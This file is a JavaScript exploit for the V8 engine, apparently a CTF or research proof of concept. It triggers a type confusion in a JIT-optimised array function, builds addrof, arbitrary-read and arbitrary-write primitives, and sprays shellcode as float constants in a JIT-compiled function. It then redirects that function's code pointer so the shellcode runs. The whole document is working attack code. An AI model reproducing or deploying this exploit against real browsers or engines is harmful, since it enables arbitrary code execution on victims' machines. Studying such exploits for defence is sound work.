/* eslint-disable camelcase */
/* eslint-disable no-extend-native */
/* eslint-disable no-unused-vars */
/* eslint-disable require-jsdoc */
function gc_minor() {
  for (let i = 0; i < 1000; i++) {
    new ArrayBuffer(0x10000);
  }
}

function gc_major() {
  new ArrayBuffer(0x7fe00000);
}

const buf = new ArrayBuffer(16);
const float64 = new Float64Array(buf);
const bigUint64 = new BigUint64Array(buf);
function f2i(f) {
  float64[0] = f;
  return bigUint64[0];
}
function i2f(i) {
  bigUint64[0] = i;
  return float64[0];
}

Number.prototype.toBigInt = function toBigInt() {
  float64[0] = this;
  return bigUint64[0];
};

BigInt.prototype.toNumber = function toNumber() {
  bigUint64[0] = this;
  return float64[0];
};

function hex(i) {
  return i.toString(16).padStart(16, '0');
}

// =================== //
//     Start here!     //
// =================== //

function sleep(miliseconds) {
  const currentTime = new Date().getTime();
  while (currentTime + miliseconds >= new Date().getTime()) {}
}

function a(f) {
  const c = [1.33753945707788105686024880174e-318, 2.2, , 4.4];
  const aaa = Math.log(2);
  if (f) {
    c[0] = {};
  }
  return c;
}

for (let i = 0; i < 4516; i++) a(false);
a(false);

a(true);

sleep(1000);

const shellcode = () => {
  return [1.95538254221075331056310651818E-246,
    1.95606125582421466942709801013E-246,
    1.99957147195425773436923756715E-246,
    1.95337673326740932133292175341E-246,
    2.63486047652296056448306022844E-284];
};

for (let i = 0; i < 0x10000; i++) {
  shellcode(); shellcode(); shellcode(); shellcode();
}
sleep(1000);

gc_minor();
gc_major();

const test = [
  1.86417340672235361759473944203e-310, 1.11253692938735068472773773438e-308,
  3.3, 4.4,
];
// %DebugPrint(test);
const obj_arr = [{}, {}, {}, {}];
// %DebugPrint(obj_arr);
const driver_arr = [1.1, 2.2, 3.3, 4.4];
// %DebugPrint(driver_arr);
// %SystemBreak();

const ccc = a(false);
// console.log(ccc[3]);
const arr = ccc[0];
// console.log(hex(f2i(arr[37])));
// %SystemBreak();

function addrof(obj) {
  obj_arr[0] = obj;
  return arr[11];
}

// const tt=[1.1];
// // %DebugPrint(tt);
// const tt2=addrof(tt);
// console.log(hex(f2i(tt2)&0xffffffffn));

function aar(addr) {
  const fake_length_elements = (8n << 32n) | (addr - 8n);
  arr[37] = i2f(fake_length_elements);
  return driver_arr[0];
}

// let t=1.1;
// let res=aar(f2i(addrof(t))&0xffffffffn);
// console.log(res)

function aaw(addr, value) {
  const fake_length_elements = (8n << 32n) | (addr - 8n);
  arr[37] = i2f(fake_length_elements);
  driver_arr[0] = value;
}

// let test_arr = [4.4, 2.2];
// aaw((f2i(addrof(test_arr)) & 0xffffffffn) + 0x20n, 3.3);
// console.log(test_arr);

// %DebugPrint(shellcode);
// %SystemBreak();
const shellcode_addr = f2i(addrof(shellcode))&0xffffffffn;
console.log(hex(shellcode_addr));
const code_addr = f2i(aar(shellcode_addr + 0x18n)) & 0xffffffffn;
console.log(hex(code_addr));
const real_inst = f2i(aar(code_addr + 0x10n)) + 0x60n;
console.log(hex(real_inst));
aaw(code_addr + 0x10n, i2f(real_inst));
// %SystemBreak();
shellcode();
